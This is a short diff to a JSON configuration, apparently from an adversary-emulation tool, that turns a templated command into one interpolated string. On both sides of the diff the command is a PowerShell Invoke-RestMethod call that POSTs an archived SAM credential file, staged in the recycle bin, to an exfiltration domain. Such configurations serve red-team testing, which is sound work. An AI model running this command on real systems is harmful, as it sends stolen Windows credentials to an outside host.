@@ -251,13 +251,7 @@
                 "target": "self.target_1",
                 "exfil": "self.exfil",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{Invoke-RestMethod -Uri ",
-                            "self.exfil_domain",
-                            " -Method Post -InFile c:\\`$recycle.bin\\sam.rar;echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{Invoke-RestMethod -Uri ${self.exfil_domain} -Method Post -InFile c:\\`$recycle.bin\\sam.rar;echo \" \"}"
                 }
             }
         },
